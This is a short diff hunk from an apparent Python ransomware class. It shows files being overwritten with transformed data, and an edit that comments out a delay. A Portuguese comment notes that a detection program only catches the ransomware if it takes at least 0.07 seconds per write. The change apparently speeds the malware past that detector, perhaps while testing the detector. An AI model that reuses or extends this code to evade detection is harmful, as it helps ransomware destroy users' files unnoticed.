@@ -60,7 +60,7 @@ class Ransomware:
                     with open(file_abs_full_path, 'wb') as file_bytes:
                         file_bytes.write(final_data)
                         print(str(os.getpid()))
-                        sleep(0.1)
+                        # sleep(0.020)
                         # O programa só pega se o ransomware demorar no min 0.07s
 
      # Criar o txt caso esteja criptografando
